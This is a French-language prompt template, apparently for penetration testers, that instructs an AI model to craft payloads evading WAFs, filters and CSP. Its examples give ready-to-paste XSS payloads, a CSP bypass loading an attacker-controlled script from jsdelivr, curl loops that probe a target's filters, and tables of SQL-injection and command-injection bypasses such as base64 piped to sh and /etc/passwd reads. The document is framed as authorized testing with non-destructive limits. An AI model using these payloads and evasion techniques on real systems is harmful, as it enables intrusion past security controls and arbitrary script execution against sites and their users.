# Exploit Payload Crafter

## Quand utiliser ce prompt

Utiliser ce prompt lorsque vous avez confirme un point d'injection et que vous devez crafter un payload specialise pour contourner les protections en place (WAF, filtres applicatifs, CSP, encodages). Ce prompt est ideal pour les situations ou un payload standard echoue et ou vous devez adapter, encoder, ou obfusquer le payload pour atteindre l'execution. Il couvre les categories XSS, SQLi, command injection, SSTI, deserialization, et inclut les techniques d'encodage et de bypass de WAF. A utiliser apres la confirmation de la vulnerabilite et avant la generation du PoC final.

## Variables a remplir

| Variable | Description | Exemple |
|----------|-------------|---------|
| `{{VULN_CLASS}}` | Classe de vulnerabilite ciblee | `XSS (Reflected)` |
| `{{INJECTION_POINT}}` | Point d'injection exact et contexte HTML/SQL/OS | `Attribut value d'un input tag: <input value="INJECT">` |
| `{{PROTECTIONS}}` | Protections detectees (WAF, filtres, CSP, encoding) | `Cloudflare WAF, CSP: script-src 'self' cdn.example.com, filtrage de <script> et onerror` |
| `{{TECH_STACK}}` | Technologies du backend et frontend | `React SPA, Node.js Express, Cloudflare CDN` |
| `{{TARGET}}` | Cible autorisee | `https://app.target.example.com` |
| `{{SCOPE}}` | Contraintes du perimetre | `Pas de denial of service, pas de modification de donnees` |
| `{{CONTEXT}}` | Contexte technique additionnel | `Charset UTF-8, Content-Type application/x-www-form-urlencoded` |
| `{{BLOCKED_PATTERNS}}` | Patterns specifiques bloques par les filtres | `<script, javascript:, onerror=, onload=, eval(, alert(` |
| `{{DB_TYPE}}` | Type de base de donnees (pour SQLi) | `MySQL 8.0` |
| `{{OS_TYPE}}` | Systeme d'exploitation cible (pour command injection) | `Linux Ubuntu 22.04` |
| `{{TEMPLATE_ENGINE}}` | Moteur de template (pour SSTI) | `Jinja2` |

---

## System Prompt

```
You are a world-class payload engineer and WAF bypass specialist with deep expertise in web application security, character encoding schemes, and protocol-level manipulation. You have extensive experience crafting payloads that bypass real-world security controls including Cloudflare, AWS WAF, ModSecurity, Akamai, Imperva, and custom application-level filters.

Your expertise spans:
- XSS payload engineering: DOM analysis, CSP bypass, event handler enumeration, script gadget discovery, polyglot construction
- SQL injection payload design: dialect-specific syntax, blind extraction optimization, WAF evasion through encoding and fragmentation
- Command injection: shell metacharacter alternatives, environment variable abuse, encoding tricks, IFS manipulation
- SSTI: engine-specific payload trees, sandbox escape, MRO traversal, filter bypass
- Deserialization: gadget chain construction, protocol-specific serialization formats, type confusion
- Encoding and obfuscation: URL encoding, double encoding, Unicode normalization (NFC/NFD/NFKC/NFKD), HTML entities, hex encoding, octal, charset tricks, overlong UTF-8

Your rules:
1. Every payload must be TESTED IN YOUR REASONING before being output. Walk through exactly how the parser/filter/WAF will process each byte.
2. Provide multiple variants ordered by likelihood of success (most likely first).
3. Explain WHY each payload works - what specific filter/WAF rule it evades and how.
4. NEVER generate payloads that cause denial of service, data destruction, or persistent damage.
5. For XSS, prefer alert(document.domain) or console.log() over destructive actions.
6. For SQLi, prefer read-only extraction (SELECT) over modification (INSERT/UPDATE/DELETE/DROP).
7. For command injection, prefer id/whoami over destructive commands.
8. If a bypass is theoretical and untested against the specific WAF version, mark it as [THEORETICAL].
9. Do NOT hallucinate WAF rule IDs, filter behaviors, or encoding transformations. If you are not certain how a specific WAF processes a payload, state your uncertainty.
10. Include the raw bytes/hex representation for any payload relying on encoding tricks.
```

---

## User Prompt

```
<context>
I have confirmed an injection point during an authorized penetration test but my standard payloads are being blocked by security controls. I need specialized payloads crafted to bypass the detected protections.

Target: {{TARGET}}
Scope: {{SCOPE}}
Context: {{CONTEXT}}
</context>

<target>
Vulnerability class: {{VULN_CLASS}}
Injection point and context: {{INJECTION_POINT}}
Detected protections: {{PROTECTIONS}}
Technology stack: {{TECH_STACK}}
Blocked patterns observed: {{BLOCKED_PATTERNS}}
Database type (if SQLi): {{DB_TYPE}}
OS type (if command injection): {{OS_TYPE}}
Template engine (if SSTI): {{TEMPLATE_ENGINE}}
</target>

<instructions>
Craft specialized bypass payloads following this exact methodology:

STEP 1 - THINKING BLOCK (mandatory):
<thinking>
- Analyze the injection context: where exactly does the input land in the output (HTML attribute, JS string, SQL query, OS command, template expression)?
- Map the character/pattern restrictions: what is blocked, what is allowed?
- Identify the filter/WAF processing order: does the WAF inspect before or after URL decoding? Is there double-decode? What about Unicode normalization?
- Enumerate candidate bypass techniques for this specific combination of vuln class + protections
- For each candidate, mentally trace the payload through the entire processing pipeline: input -> WAF -> application decode -> parser -> execution
- Rank candidates by likelihood of success
- Consider encoding chain: which encoding layers are decoded at which stage?
</thinking>

STEP 2 - Generate the payload package:

For each payload, provide:
a) The raw payload string (copy-pasteable)
b) The URL-encoded version (for HTTP transport)
c) Step-by-step explanation of how it bypasses each protection layer
d) The execution context: what the parser/interpreter sees after decoding
e) Expected result when the payload executes

Generate payloads in these tiers:
- TIER 1: High confidence - well-known bypasses for the detected protections
- TIER 2: Medium confidence - less common techniques, may require adjustment
- TIER 3: Experimental - creative/novel approaches, may need iteration

STEP 3 - Provide encoding/obfuscation variants:
For the most promising payload, generate encoded variants using all applicable encoding schemes.

STEP 4 - WAF-specific bypass techniques:
If a specific WAF is identified, provide techniques known to work against that product.
</instructions>

<output_format>
Return a JSON object with this exact structure:
{
  "analysis": {
    "injection_context": "string - precise description of where input lands",
    "character_restrictions": {
      "blocked": ["list of blocked characters/patterns"],
      "allowed": ["list of confirmed allowed characters/patterns"],
      "unknown": ["list of characters not yet tested"]
    },
    "filter_processing_model": "string - description of how the filter processes input",
    "bypass_strategy": "string - high-level approach to bypass"
  },
  "payloads": [
    {
      "tier": "integer - 1, 2, or 3",
      "technique": "string - name of the bypass technique",
      "payload_raw": "string - the raw payload",
      "payload_url_encoded": "string - URL-encoded version",
      "payload_hex": "string - hex representation of key bytes if relevant",
      "bypass_explanation": "string - detailed explanation of how this bypasses each protection",
      "decoded_by_parser": "string - what the final interpreter/parser sees",
      "expected_result": "string - what happens when the payload executes",
      "confidence": "string - High/Medium/Low",
      "known_working_against": ["list of specific WAFs/filters this is known to bypass"],
      "limitations": "string - when this payload will NOT work"
    }
  ],
  "encoding_variants": {
    "base_payload": "string - the payload being encoded",
    "variants": [
      {
        "encoding": "string - encoding method name",
        "encoded_payload": "string - the encoded version",
        "use_case": "string - when to use this encoding"
      }
    ]
  },
  "waf_specific_techniques": [
    {
      "waf_product": "string - WAF name and version if known",
      "technique": "string - bypass technique name",
      "description": "string - detailed description",
      "example_payload": "string - example payload using this technique"
    }
  ],
  "testing_methodology": {
    "steps": [
      {
        "step": "integer",
        "description": "string - what to test",
        "command": "string - curl command or browser action",
        "success_indicator": "string - how to know it worked"
      }
    ]
  },
  "safety_notes": "string - confirmation that all payloads are non-destructive"
}
</output_format>

<constraints>
- All XSS payloads must use alert(document.domain), console.log(), or other non-destructive JS
- All SQLi payloads must be read-only (SELECT only, no modification statements)
- All command injection payloads must use safe commands (id, whoami, hostname)
- Never generate payloads designed to cause denial of service
- Provide real, syntactically correct payloads - not pseudocode
- Each payload must be self-contained and copy-pasteable
- If a technique is WAF-version-specific, note which versions are affected
- Mark any untested/theoretical bypass with [THEORETICAL]
- Do not invent WAF bypass techniques - only use documented or researched methods
</constraints>
```

---

## Prefill (assistant)

```
{
  "analysis": {
    "injection_context": "
```

---

## Few-shot Examples

### Example 1: XSS Payload - CSP Bypass via JSONP Endpoint

**Input variables:**
- `{{VULN_CLASS}}`: `XSS (Reflected)`
- `{{INJECTION_POINT}}`: `Reflected in <div class="search-results">INJECT</div> - raw HTML context`
- `{{PROTECTIONS}}`: `CSP: script-src 'self' https://cdn.jsdelivr.net; Cloudflare WAF (free tier); Application filter blocks <script and javascript:`
- `{{TECH_STACK}}`: `React SPA served by Nginx, Cloudflare CDN`
- `{{BLOCKED_PATTERNS}}`: `<script, </script>, javascript:, onerror, onload`

**Expected output (abbreviated):**

```json
{
  "analysis": {
    "injection_context": "User input reflected inside a div element in raw HTML context. No attribute encoding, no JS string context. Direct HTML injection is possible if we bypass the pattern filters.",
    "character_restrictions": {
      "blocked": ["<script", "</script>", "javascript:", "onerror", "onload"],
      "allowed": ["<img", "<svg", "<details", "<body", "onfocus", "onmouseover", "autofocus", "tabindex"],
      "unknown": ["<iframe", "<embed", "<object", "onanimationend"]
    },
    "filter_processing_model": "Cloudflare WAF (free tier) applies signature-based detection. Application filter applies case-sensitive string matching for blocked patterns. CSP restricts script execution to self and cdn.jsdelivr.net.",
    "bypass_strategy": "Use an HTML tag not in the blocklist with an event handler not in the blocklist to trigger JS. For CSP bypass, leverage jsdelivr.net as a script gadget host or use allowed inline event handlers if CSP allows unsafe-inline for event handlers (it does not here). Alternative: use a <script> tag loaded from jsdelivr.net pointing to a controlled package."
  },
  "payloads": [
    {
      "tier": 1,
      "technique": "SVG tag with onfocus event handler and autofocus",
      "payload_raw": "<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>",
      "payload_url_encoded": "%3Csvg%3E%3Canimate%20onbegin%3Dalert(document.domain)%20attributeName%3Dx%20dur%3D1s%3E",
      "payload_hex": "",
      "bypass_explanation": "1) WAF bypass: <svg> is not in the blocked pattern list (only <script is blocked). 'onbegin' is not in the blocked event handler list (only onerror and onload). 2) Filter bypass: case-sensitive filter does not match 'onbegin'. 3) CSP: inline event handlers are blocked by CSP unless 'unsafe-inline' is present. This payload will fire the JS but CSP may block it. [REQUIRES CSP TESTING]",
      "decoded_by_parser": "Browser parses SVG animate element, fires onbegin event which executes alert(document.domain)",
      "expected_result": "JavaScript alert showing the document.domain value, OR CSP violation in console if CSP blocks inline handlers",
      "confidence": "Medium",
      "known_working_against": ["Cloudflare WAF free tier (as of 2024)", "Simple pattern-based application filters"],
      "limitations": "CSP without unsafe-inline will block the inline event handler execution. Need CSP bypass as well."
    },
    {
      "tier": 1,
      "technique": "Script tag loaded from jsdelivr.net (CSP-allowed origin)",
      "payload_raw": "<script src=\"https://cdn.jsdelivr.net/npm/attacker-controlled-package@1.0.0/payload.js\"></script>",
      "payload_url_encoded": "%3Cscript%20src%3D%22https%3A%2F%2Fcdn.jsdelivr.net%2Fnpm%2Fattacker-controlled-package%401.0.0%2Fpayload.js%22%3E%3C%2Fscript%3E",
      "payload_hex": "",
      "bypass_explanation": "1) CSP bypass: cdn.jsdelivr.net is explicitly allowed in script-src. An attacker can publish an npm package containing malicious JS, which jsdelivr.net will serve. 2) WAF bypass: the Cloudflare free tier may not block script tags pointing to whitelisted domains. 3) Application filter: this WILL be caught by the <script filter. Need to combine with encoding or case variation.",
      "decoded_by_parser": "Browser loads and executes the external JS file from the CSP-allowed origin",
      "expected_result": "Arbitrary JavaScript execution in the context of the target origin",
      "confidence": "High for CSP bypass, Low for filter bypass without additional encoding",
      "known_working_against": ["Any CSP that allows cdn.jsdelivr.net without hash/nonce"],
      "limitations": "Requires publishing an npm package first. The <script tag will be caught by the application filter - needs combination with case bypass (<SCRIPT or <ScRiPt) or encoding."
    },
    {
      "tier": 2,
      "technique": "Case variation to bypass application filter + SVG for WAF bypass",
      "payload_raw": "<ScRiPt src=\"https://cdn.jsdelivr.net/npm/attacker-pkg@1.0.0/p.js\"></ScRiPt>",
      "payload_url_encoded": "%3CScRiPt%20src%3D%22https%3A%2F%2Fcdn.jsdelivr.net%2Fnpm%2Fattacker-pkg%401.0.0%2Fp.js%22%3E%3C%2FScRiPt%3E",
      "payload_hex": "",
      "bypass_explanation": "HTML tag names are case-insensitive. The application filter blocks lowercase '<script' but mixed case '<ScRiPt' may bypass a case-sensitive string match. Combined with the jsdelivr.net CSP bypass for script execution.",
      "decoded_by_parser": "Browser interprets <ScRiPt> as <script> and loads the external JS from the CSP-allowed domain",
      "expected_result": "Arbitrary JS execution if both filter and CSP are bypassed",
      "confidence": "Medium",
      "known_working_against": ["Case-sensitive application filters"],
      "limitations": "Cloudflare WAF normalizes case before matching, so this may still be caught by the WAF even if it bypasses the app filter."
    },
    {
      "tier": 3,
      "technique": "Details/summary tag with ontoggle event",
      "payload_raw": "<details open ontoggle=alert(document.domain)><summary>click</summary></details>",
      "payload_url_encoded": "%3Cdetails%20open%20ontoggle%3Dalert(document.domain)%3E%3Csummary%3Eclick%3C%2Fsummary%3E%3C%2Fdetails%3E",
      "payload_hex": "",
      "bypass_explanation": "1) <details> tag is not in any blocklist. 2) 'ontoggle' event is not blocked. 3) 'open' attribute causes the details to be open by default, triggering ontoggle. However, CSP inline restriction still applies.",
      "decoded_by_parser": "Browser renders details element in open state, fires ontoggle event",
      "expected_result": "JS execution via ontoggle if CSP allows inline handlers, otherwise CSP block",
      "confidence": "Low",
      "known_working_against": ["Pattern-based filters not covering details/ontoggle"],
      "limitations": "CSP blocks inline handlers. This only works if CSP has unsafe-inline or is not enforced."
    }
  ],
  "encoding_variants": {
    "base_payload": "<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>",
    "variants": [
      {
        "encoding": "HTML entity encoding (decimal)",
        "encoded_payload": "&#60;svg&#62;&#60;animate onbegin&#61;alert(document.domain) attributeName&#61;x dur&#61;1s&#62;",
        "use_case": "When input is reflected in HTML context and HTML entities are decoded before rendering"
      },
      {
        "encoding": "HTML entity encoding (hex)",
        "encoded_payload": "&#x3c;svg&#x3e;&#x3c;animate onbegin&#x3d;alert(document.domain) attributeName&#x3d;x dur&#x3d;1s&#x3e;",
        "use_case": "When decimal entities are blocked but hex entities are not"
      },
      {
        "encoding": "Double URL encoding",
        "encoded_payload": "%253Csvg%253E%253Canimate%2520onbegin%253Dalert(document.domain)%2520attributeName%253Dx%2520dur%253D1s%253E",
        "use_case": "When the application performs double URL decoding (e.g., proxy + application both decode)"
      },
      {
        "encoding": "Unicode escape (JS context)",
        "encoded_payload": "\\u003csvg\\u003e\\u003canimate onbegin=alert(document.domain) attributeName=x dur=1s\\u003e",
        "use_case": "When input is processed through a JavaScript context that resolves Unicode escapes"
      }
    ]
  },
  "waf_specific_techniques": [
    {
      "waf_product": "Cloudflare WAF (Free Tier)",
      "technique": "Chunked transfer encoding",
      "description": "Cloudflare free tier may not inspect chunked request bodies completely. Splitting the payload across chunks can evade signature matching.",
      "example_payload": "Use Transfer-Encoding: chunked and split payload across multiple chunks"
    },
    {
      "waf_product": "Cloudflare WAF (Free Tier)",
      "technique": "Unusual content types",
      "description": "Submitting with Content-Type: text/plain or multipart/form-data can sometimes bypass WAF rules that only inspect application/x-www-form-urlencoded",
      "example_payload": "Change Content-Type header and adjust payload format accordingly"
    }
  ],
  "testing_methodology": {
    "steps": [
      {
        "step": 1,
        "description": "Test which HTML tags are allowed through the filter",
        "command": "for tag in img svg details iframe embed object video audio; do echo \"Testing <$tag>\"; curl -s -o /dev/null -w '%{http_code}' 'https://app.target.example.com/search?q=<'$tag'>test'; echo; done",
        "success_indicator": "200 response means the tag is not blocked by WAF"
      },
      {
        "step": 2,
        "description": "Test which event handlers are allowed",
        "command": "for evt in onfocus onblur onmouseover onbegin ontoggle onanimationend; do echo \"Testing $evt\"; curl -s -o /dev/null -w '%{http_code}' 'https://app.target.example.com/search?q=<div+'$evt'=x>'; echo; done",
        "success_indicator": "200 response means the event handler is not blocked"
      },
      {
        "step": 3,
        "description": "Test the most promising payload",
        "command": "curl -v 'https://app.target.example.com/search?q=%3Csvg%3E%3Canimate%20onbegin%3Dalert(document.domain)%20attributeName%3Dx%20dur%3D1s%3E'",
        "success_indicator": "Payload reflected in response without encoding/stripping"
      }
    ]
  },
  "safety_notes": "All XSS payloads use alert(document.domain) or console.log() for demonstration only. No session theft, no cookie exfiltration, no persistent stored payloads. SQLi payloads use SELECT only. Command injection payloads use id/whoami only."
}
```

---

### Example 2: SQLi WAF Bypass Payloads (key patterns)

**Common bypass patterns for reference:**

| Technique | Standard Payload | Bypass Variant | Bypasses |
|---|---|---|---|
| Comment insertion | `UNION SELECT` | `UN/**/ION SEL/**/ECT` | Keyword-based WAFs |
| Case variation | `union select` | `UnIoN SeLeCt` | Case-sensitive filters |
| Inline comments (MySQL) | `UNION SELECT` | `/*!50000UNION*/ /*!50000SELECT*/` | ModSecurity CRS |
| Whitespace alternatives | `UNION SELECT` | `UNION%09SELECT`, `UNION%0bSELECT` | Space-only whitespace filters |
| Scientific notation | `1 OR 1=1` | `1 OR 1e0=1e0` | Numeric comparison filters |
| String concatenation | `'admin'` | `'ad'+'min'` (MSSQL), `'ad' 'min'` (MySQL) | String literal filters |
| Hex encoding | `'admin'` | `0x61646d696e` (MySQL) | Quote filters |
| Double URL encode | `' OR 1=1--` | `%2527%20OR%201%3D1--` | Single-decode WAFs |
| HTTP Parameter Pollution | `?id=1 UNION SELECT` | `?id=1&id=UNION&id=SELECT` | Parameter-level inspection |
| JSON/XML content type | `id=1' OR '1'='1` | `{"id": "1' OR '1'='1"}` | Form-only inspection WAFs |

### Example 3: Command Injection Bypass Patterns (key patterns)

| Technique | Standard | Bypass | Explanation |
|---|---|---|---|
| Space bypass (IFS) | `; id` | `;${IFS}id` | Uses Internal Field Separator |
| Space bypass (tab) | `; id` | `;%09id` | Tab character as separator |
| Space bypass (brace) | `cat /etc/passwd` | `{cat,/etc/passwd}` | Brace expansion |
| Char bypass | `cat` | `c''a""t` | Empty quotes ignored by shell |
| Wildcard | `/etc/passwd` | `/e??/p????d` | Glob matching |
| Variable concat | `cat` | `c=$'\x63\x61\x74';$c` | Hex in $'' strings |
| Base64 | `id` | `echo aWQ=\|base64 -d\|sh` | Encode entire command |
| Backslash | `cat` | `c\at` | Backslash ignored in bash |
| Env variable | `whoami` | `${PATH:0:1}..${PATH:0:1}bin${PATH:0:1}whoami` | Path construction from env |
